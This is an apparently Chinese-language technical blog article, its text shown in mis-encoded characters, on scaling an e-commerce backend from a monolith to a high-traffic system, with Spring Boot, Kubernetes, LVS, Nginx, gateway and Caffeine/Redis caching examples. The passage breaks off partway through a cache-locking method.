<p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªæœ€ç®€å•çš„ç”µå•†ç³»ç»Ÿå¼€å§‹ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦‚ä½•ä¸€æ­¥æ­¥æ¼”è¿›åˆ°æ”¯æ’‘åƒä¸‡çº§æµé‡çš„ã€‚</p>
<h3 data-id="heading-3">é˜¶æ®µä¸€ï¼šå•æœºå•ä½“æ¶æ„ï¼ˆæ—¥è¯·æ±‚&lt;10ä¸‡ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœ€ç®€å•çš„Spring Bootå•ä½“åº”ç”¨</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonolithicApp</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductService productService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-meta">@GetMapping("/product/{id}")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-keyword">return</span> productService.getById(id);
    }
    
    <span class="hljs-meta">@PostMapping("/order")</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> orderService.createOrder(request);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(MonolithicApp.class, args);
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æ</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰æœåŠ¡éƒ½åœ¨ä¸€ä¸ªJVMè¿›ç¨‹ä¸­ï¼Œä¸€ä¸ªbugå¯èƒ½å¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒ</li>
<li>æ•°æ®åº“æˆä¸ºå•ç‚¹ç“¶é¢ˆï¼Œæ— æ³•æ°´å¹³æ‰©å±•</li>
<li>å‘å¸ƒæ—¶éœ€è¦åœæœºï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
</ul>
<h3 data-id="heading-4">é˜¶æ®µäºŒï¼šå‚ç›´æ‹†åˆ†ï¼ˆæ—¥è¯·æ±‚10ä¸‡-100ä¸‡ï¼‰</h3>
<p>å½“ç³»ç»Ÿå‹åŠ›å¢å¤§æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆè¿›è¡Œå‚ç›´æ‹†åˆ†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•†å“æœåŠ¡ - ç‹¬ç«‹éƒ¨ç½²</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductServiceApp</span> {
    
    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// ç›´æ¥æŸ¥è¯¢æ•°æ®åº“</span>
        <span class="hljs-keyword">return</span> productRepository.findById(id).orElse(<span class="hljs-literal">null</span>);
    }
}

<span class="hljs-comment">// è®¢å•æœåŠ¡ - ç‹¬ç«‹éƒ¨ç½²  </span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/order")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceApp</span> {
    
    <span class="hljs-meta">@PostMapping("/")</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderRequest request)</span> {
        <span class="hljs-comment">// é€šè¿‡HTTPè°ƒç”¨å•†å“æœåŠ¡</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> restTemplate.getForObject(
            <span class="hljs-string">"http://product-service/product/"</span> + request.getProductId(),
            Product.class
        );
        <span class="hljs-comment">// åˆ›å»ºè®¢å•é€»è¾‘</span>
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }
}
</code></pre>
<p><strong>å…³é”®æ”¹è¿›</strong>ï¼š</p>
<ol>
<li>æ•°æ®åº“æŒ‰ä¸šåŠ¡æ‹†åˆ†ï¼šå•†å“åº“ã€è®¢å•åº“åˆ†ç¦»</li>
<li>æœåŠ¡ç‹¬ç«‹éƒ¨ç½²ï¼Œæ•…éšœéš”ç¦»</li>
<li>å¯ä»¥é’ˆå¯¹ä¸åŒæœåŠ¡è¿›è¡Œé’ˆå¯¹æ€§ä¼˜åŒ–</li>
</ol>
<h3 data-id="heading-5">é˜¶æ®µä¸‰ï¼šæ°´å¹³æ‰©å±•ä¸æœåŠ¡æ²»ç†ï¼ˆæ—¥è¯·æ±‚100ä¸‡-500ä¸‡ï¼‰</h3>
<p>å½“å•å®ä¾‹æ— æ³•æ‰¿è½½æµé‡æ—¶ï¼Œæˆ‘ä»¬å¼€å§‹æ°´å¹³æ‰©å±•ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Kuberneteséƒ¨ç½²é…ç½®æ–‡ä»¶ç¤ºä¾‹</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 3ä¸ªå®ä¾‹</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">matchLabels:</span>
      <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">metadata:</span>
      <span class="hljs-attr">labels:</span>
        <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">product-service:latest</span>
        <span class="hljs-attr">resources:</span>
          <span class="hljs-attr">limits:</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"512Mi"</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"500m"</span>
        <span class="hljs-attr">readinessProbe:</span>  <span class="hljs-comment"># å°±ç»ªæ¢é’ˆ</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/actuator/health</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">30</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>
        <span class="hljs-attr">livenessProbe:</span>   <span class="hljs-comment"># å­˜æ´»æ¢é’ˆ</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/actuator/health</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">60</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">product-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">app:</span> <span class="hljs-string">product-service</span>
  <span class="hljs-attr">ports:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>
    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>
  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
</code></pre>
<p><strong>å…³é”®æ”¹è¿›</strong>ï¼š</p>
<ol>
<li>æœåŠ¡å¤šå®ä¾‹éƒ¨ç½²ï¼Œè´Ÿè½½å‡è¡¡</li>
<li>å¼•å…¥æœåŠ¡æ³¨å†Œä¸å‘ç°ï¼ˆå¦‚Nacosã€Consulï¼‰</li>
<li>å¢åŠ å¥åº·æ£€æŸ¥ï¼Œå®ç°æ•…éšœè‡ªåŠ¨è½¬ç§»</li>
<li>é…ç½®ä¸­å¿ƒç»Ÿä¸€ç®¡ç†é…ç½®</li>
</ol>
<h3 data-id="heading-6">é˜¶æ®µå››ï¼šå…¨é“¾è·¯ä¼˜åŒ–ï¼ˆæ—¥è¯·æ±‚500ä¸‡ä»¥ä¸Šï¼‰</h3>
<p>å½“ç³»ç»Ÿè§„æ¨¡ç»§ç»­æ‰©å¤§ï¼Œæˆ‘ä»¬éœ€è¦æ›´ç²¾ç»†çš„ä¼˜åŒ–ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57fed678ad7445eb99e2e362c586080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=XBPgxLcHgdmKyxIyKpZfWfI%2BKTI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ffdbac90324ad29f67a15cf5a13ac3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=q9ROmgL%2FTnK1L6nWKW4i%2B9gX6wk%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªæ¶æ„å›¾å±•ç¤ºäº†ä¸€ä¸ªå®Œæ•´çš„åƒä¸‡çº§ç³»ç»Ÿæ¶æ„ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ·±å…¥æ¯ä¸ªå…³é”®ç»„ä»¶ã€‚</p>
<h2 data-id="heading-7">03 è´Ÿè½½å‡è¡¡ï¼šæµé‡åˆ†å‘çš„é«˜å¯ç”¨ä¹‹é“</h2>
<p>è´Ÿè½½å‡è¡¡æ˜¯åƒä¸‡çº§ç³»ç»Ÿçš„ç¬¬ä¸€é“é˜²çº¿ã€‚æˆ‘ä»¬é€šå¸¸é‡‡ç”¨å¤šå±‚è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼š</p>
<h3 data-id="heading-8">å››å±‚è´Ÿè½½å‡è¡¡ï¼ˆLVS/ELBï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># LVS DRæ¨¡å¼é…ç½®ç¤ºä¾‹</span>
<span class="hljs-comment"># çœŸå®æœåŠ¡å™¨é…ç½®å›ç¯æ¥å£</span>
ifconfig lo:0 192.168.1.100 netmask 255.255.255.255 up
route add -host 192.168.1.100 dev lo:0

<span class="hljs-comment"># é…ç½®ARPæŠ‘åˆ¶</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1"</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"2"</span> &gt; /proc/sys/net/ipv4/conf/lo/arp_announce
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1"</span> &gt; /proc/sys/net/ipv4/conf/all/arp_ignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"2"</span> &gt; /proc/sys/net/ipv4/conf/all/arp_announce

<span class="hljs-comment"># LVS Directoré…ç½®</span>
ipvsadm -A -t 192.168.1.100:80 -s wrr
ipvsadm -a -t 192.168.1.100:80 -r 192.168.1.10:8080 -g -w 1
ipvsadm -a -t 192.168.1.100:80 -r 192.168.1.11:8080 -g -w 2
</code></pre>
<h3 data-id="heading-9">ä¸ƒå±‚è´Ÿè½½å‡è¡¡ï¼ˆNginx/APIç½‘å…³ï¼‰</h3>
<pre><code class="hljs language-nginx" lang="nginx"># Nginxè´Ÿè½½å‡è¡¡é…ç½®
upstream backend_servers {
    # åŠ æƒè½®è¯¢ï¼Œé…åˆå¥åº·æ£€æŸ¥
    server 192.168.1.10:8080 weight=3 max_fails=3 fail_timeout=30s;
    server 192.168.1.11:8080 weight=2 max_fails=3 fail_timeout=30s;
    server 192.168.1.12:8080 weight=1 max_fails=3 fail_timeout=30s;
    
    # ä¼šè¯ä¿æŒï¼ˆéœ€è¦æ—¶å¼€å¯ï¼‰
    # sticky cookie srv_id expires=1h domain=.example.com path=/;
    
    # å¤‡ä»½æœåŠ¡å™¨
    server 192.168.1.13:8080 backup;
}

server {
    listen 80;
    server_name api.example.com;
    
    # é™æµé…ç½®
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/s;
    
    location /api/ {
        # åº”ç”¨é™æµ
        limit_req zone=api_limit burst=50 nodelay;
        
        # è¿æ¥è¶…æ—¶è®¾ç½®
        proxy_connect_timeout 3s;
        proxy_read_timeout 10s;
        proxy_send_timeout 10s;
        
        # è´Ÿè½½å‡è¡¡
        proxy_pass http://backend_servers;
        
        # æ•…éšœè½¬ç§»
        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503;
        proxy_next_upstream_timeout 0;
        proxy_next_upstream_tries 3;
        
        # æ·»åŠ ä»£ç†å¤´
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
    
    # å¥åº·æ£€æŸ¥ç«¯ç‚¹
    location /health {
        access_log off;
        return 200 "healthy\n";
    }
}
</code></pre>
<h3 data-id="heading-10">ç°ä»£APIç½‘å…³ï¼ˆSpring Cloud Gatewayï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GatewayConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RouteLocator <span class="hljs-title function_">customRouteLocator</span><span class="hljs-params">(RouteLocatorBuilder builder)</span> {
        <span class="hljs-keyword">return</span> builder.routes()
            .route(<span class="hljs-string">"product_route"</span>, r -&gt; r
                .path(<span class="hljs-string">"/api/product/**"</span>)
                .filters(f -&gt; f
                    .requestRateLimiter(config -&gt; config
                        .setRateLimiter(redisRateLimiter())
                        .setKeyResolver(ipKeyResolver()))
                    .circuitBreaker(config -&gt; config
                        .setName(<span class="hljs-string">"productCircuitBreaker"</span>)
                        .setFallbackUri(<span class="hljs-string">"forward:/fallback/product"</span>))
                    .rewritePath(<span class="hljs-string">"/api/(?&lt;segment&gt;.*)"</span>, <span class="hljs-string">"/${segment}"</span>)
                )
                .uri(<span class="hljs-string">"lb://product-service"</span>))
            .route(<span class="hljs-string">"order_route"</span>, r -&gt; r
                .path(<span class="hljs-string">"/api/order/**"</span>)
                .filters(f -&gt; f
                    .requestRateLimiter(config -&gt; config
                        .setRateLimiter(redisRateLimiter())
                        .setKeyResolver(userKeyResolver()))
                    .retry(config -&gt; config
                        .setRetries(<span class="hljs-number">3</span>)
                        .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR))
                )
                .uri(<span class="hljs-string">"lb://order-service"</span>))
            .build();
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisRateLimiter <span class="hljs-title function_">redisRateLimiter</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¯ç§’10ä¸ªè¯·æ±‚ï¼Œçªå‘å®¹é‡20</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisRateLimiter</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KeyResolver <span class="hljs-title function_">ipKeyResolver</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> exchange -&gt; Mono.just(
            exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()
        );
    }
}
</code></pre>
<h2 data-id="heading-11">04 ç¼“å­˜ç­–ç•¥ï¼šæ€§èƒ½åŠ é€Ÿçš„æ™ºèƒ½åˆ†å±‚</h2>
<p>ç¼“å­˜æ˜¯æå‡ç³»ç»Ÿæ€§èƒ½æœ€æœ‰æ•ˆçš„æ‰‹æ®µä¹‹ä¸€ã€‚åƒä¸‡çº§ç³»ç»Ÿéœ€è¦è®¾è®¡æ™ºèƒ½çš„å¤šçº§ç¼“å­˜ç­–ç•¥ã€‚</p>
<h3 data-id="heading-12">å››çº§ç¼“å­˜æ¶æ„</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94af7efb4b914d118986805a9825e3c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=sKizoiUNdeqhlaTVPzmlSK8mpyw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">1. æœ¬åœ°ç¼“å­˜ï¼ˆCaffeineï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCacheManager</span> {
    
    <span class="hljs-comment">// ä¸€çº§ç¼“å­˜ï¼šGuava Cacheï¼ˆé€‚åˆè¾ƒå°æ•°æ®é‡ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; guavaCache = CacheBuilder.newBuilder()
            .maximumSize(<span class="hljs-number">10000</span>)
            .expireAfterWrite(<span class="hljs-number">5</span>, TimeUnit.MINUTES)
            .recordStats()
            .build();
    
    <span class="hljs-comment">// äºŒçº§ç¼“å­˜ï¼šCaffeineï¼ˆé«˜æ€§èƒ½ï¼ŒW-TinyLFUç®—æ³•ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; caffeineCache = Caffeine.newBuilder()
            .maximumSize(<span class="hljs-number">50000</span>)
            .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES)
            .refreshAfterWrite(<span class="hljs-number">1</span>, TimeUnit.MINUTES)
            .recordStats()
            .build();
    
    <span class="hljs-comment">// çƒ­ç‚¹æ•°æ®ç‰¹æ®Šç¼“å­˜ï¼ˆå¦‚ç§’æ€å•†å“ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; hotDataCache = Caffeine.newBuilder()
            .maximumSize(<span class="hljs-number">1000</span>)
            .expireAfterWrite(<span class="hljs-number">30</span>, TimeUnit.SECONDS) <span class="hljs-comment">// çƒ­ç‚¹æ•°æ®è¿‡æœŸå¿«</span>
            .recordStats()
            .build();
    
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">getWithCache</span><span class="hljs-params">(String key, Class&lt;T&gt; clazz, 
                              Supplier&lt;T&gt; loader, CacheLevel level)</span> {
        <span class="hljs-keyword">switch</span> (level) {
            <span class="hljs-keyword">case</span> LOCAL_HOT:
                <span class="hljs-keyword">return</span> getFromHotCache(key, clazz, loader);
            <span class="hljs-keyword">case</span> LOCAL_NORMAL:
                <span class="hljs-keyword">return</span> getFromLocalCache(key, clazz, loader);
            <span class="hljs-keyword">case</span> DISTRIBUTED:
                <span class="hljs-keyword">return</span> getFromDistributedCache(key, clazz, loader);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> loader.get();
        }
    }
    
    <span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">getFromLocalCache</span><span class="hljs-params">(String key, Class&lt;T&gt; clazz, Supplier&lt;T&gt; loader)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> (T) caffeineCache.get(key, k -&gt; {
                <span class="hljs-type">T</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> loader.get();
                <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// ç¼“å­˜ç©ºå€¼ï¼Œé˜²æ­¢ç¼“å­˜ç©¿é€</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullValue</span>();
                }
                <span class="hljs-keyword">return</span> value;
            });
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// æœ¬åœ°ç¼“å­˜å¼‚å¸¸ï¼Œé™çº§ç›´æ¥åŠ è½½</span>
            <span class="hljs-keyword">return</span> loader.get();
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> LocalCacheManager cacheManager;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Product&gt; redisTemplate;
    
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithCache</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + productId;
        
        <span class="hljs-keyword">return</span> cacheManager.getWithCache(cacheKey, Product.class, () -&gt; {
            <span class="hljs-comment">// å…ˆæŸ¥Redisåˆ†å¸ƒå¼ç¼“å­˜</span>
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> product;
            }
            
            <span class="hljs-comment">// Redisæ²¡æœ‰ï¼ŒæŸ¥æ•°æ®åº“</span>
            product = productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// å¼‚æ­¥å›å†™åˆ°Redisï¼Œä¸é˜»å¡å½“å‰è¯·æ±‚</span>
                CompletableFuture.runAsync(() -&gt; 
                    redisTemplate.opsForValue().set(cacheKey, product, <span class="hljs-number">1</span>, TimeUnit.HOURS)
                );
            }
            
            <span class="hljs-keyword">return</span> product;
        }, CacheLevel.LOCAL_NORMAL);
    }
}
</code></pre>
<h3 data-id="heading-14">2. åˆ†å¸ƒå¼ç¼“å­˜ï¼ˆRedisé›†ç¾¤ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisConnectionFactory <span class="hljs-title function_">redisConnectionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RedisClusterConfiguration</span> <span class="hljs-variable">clusterConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisClusterConfiguration</span>();
        
        <span class="hljs-comment">// é›†ç¾¤èŠ‚ç‚¹é…ç½®</span>
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.100"</span>, <span class="hljs-number">6379</span>));
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.101"</span>, <span class="hljs-number">6379</span>));
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.102"</span>, <span class="hljs-number">6379</span>));
        
        <span class="hljs-comment">// é›†ç¾¤é…ç½®</span>
        clusterConfig.setMaxRedirects(<span class="hljs-number">3</span>); <span class="hljs-comment">// æœ€å¤§é‡å®šå‘æ¬¡æ•°</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisConnectionFactory</span>(clusterConfig);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">()</span> {
        RedisTemplate&lt;String, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(redisConnectionFactory());
        
        <span class="hljs-comment">// ä½¿ç”¨Stringåºåˆ—åŒ–å™¨</span>
        template.setKeySerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());
        template.setValueSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>());
        
        <span class="hljs-comment">// å¼€å¯äº‹åŠ¡æ”¯æŒ</span>
        template.setEnableTransactionSupport(<span class="hljs-literal">true</span>);
        
        <span class="hljs-keyword">return</span> template;
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">RedisCacheConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RedisCacheConfiguration.defaultCacheConfig()
                .entryTtl(Duration.ofMinutes(<span class="hljs-number">30</span>)) <span class="hljs-comment">// é»˜è®¤è¿‡æœŸæ—¶é—´</span>
                .disableCachingNullValues() <span class="hljs-comment">// ä¸ç¼“å­˜nullå€¼</span>
                .serializeKeysWith(RedisSerializationContext.SerializationPair
                        .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>()))
                .serializeValuesWith(RedisSerializationContext.SerializationPair
                        .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>()));
        
        <span class="hljs-comment">// ä¸åŒç¼“å­˜åŒºåŸŸçš„ä¸åŒé…ç½®</span>
        Map&lt;String, RedisCacheConfiguration&gt; cacheConfigurations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        cacheConfigurations.put(<span class="hljs-string">"product"</span>, config.entryTtl(Duration.ofHours(<span class="hljs-number">1</span>)));
        cacheConfigurations.put(<span class="hljs-string">"user"</span>, config.entryTtl(Duration.ofDays(<span class="hljs-number">1</span>)));
        
        <span class="hljs-keyword">return</span> RedisCacheManager.builder(connectionFactory)
                .cacheDefaults(config)
                .withInitialCacheConfigurations(cacheConfigurations)
                .transactionAware()
                .build();
    }
}
</code></pre>
<h3 data-id="heading-15">3. ç¼“å­˜ç­–ç•¥ä¸é—®é¢˜è§£å†³</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheStrategyService</span> {
    
    <span class="hljs-comment">/**
     * é˜²æ­¢ç¼“å­˜ç©¿é€ï¼šç¼“å­˜ç©ºå€¼
     */</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithNullCache</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + productId;
        <span class="hljs-type">String</span> <span class="hljs-variable">nullCacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product_null:"</span> + productId;
        
        <span class="hljs-comment">// å…ˆæ£€æŸ¥ç©ºå€¼ç¼“å­˜</span>
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(redisTemplate.hasKey(nullCacheKey))) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// çŸ¥é“æ˜¯ç©ºå€¼ï¼Œç›´æ¥è¿”å›ï¼Œä¸æŸ¥æ•°æ®åº“</span>
        }
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// åŠ åˆ†å¸ƒå¼é”ï¼Œé˜²æ­¢ç¼“å­˜å‡»ç©¿</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:product:"</span> + productId;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> {
            locked = tryLock(lockKey, <span class="hljs-number">3</span>, TimeUnit.SECONDS);
